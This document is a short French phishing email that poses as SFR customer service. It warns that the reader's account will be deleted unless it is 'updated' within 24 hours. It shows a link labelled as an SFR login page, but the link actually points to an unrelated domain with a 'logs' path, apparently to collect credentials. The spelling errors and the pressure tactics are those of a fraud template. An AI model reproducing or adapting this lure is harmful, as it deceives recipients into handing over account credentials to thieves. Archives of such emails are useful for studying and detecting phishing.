 Votre comptes chez Sfr.fr doit étre mise a jour Cher(e) Client(e), Dernière mise a jour le 12-avril-2012 06:42:37. Votre comptes chez Sfr.fr doit étre mise a jour tous les 60 jours sinon il seras retiré de notre système. S'il vous plait suivre le lien ci-dessous pour procceder a la mise a jour de votre compte: https://subscribe.sfr.fr/login/?FOLDER=SFR_Confirm (http://brisiao.com/logs/service-secure.php) Vous avez 24 heurs pour mettre a jour votre compte SFR sinon il seras retiré de notre system IBE. Merci de votre confiance. Votre service clients Internet Merci de ne pas rèpondre a ce courrier èlectronique. Pour nous contacter cliquer ici (#). En cas de difficultès dans l'utilisation de ce service, nous vous invitons a consulter l'Assistance. 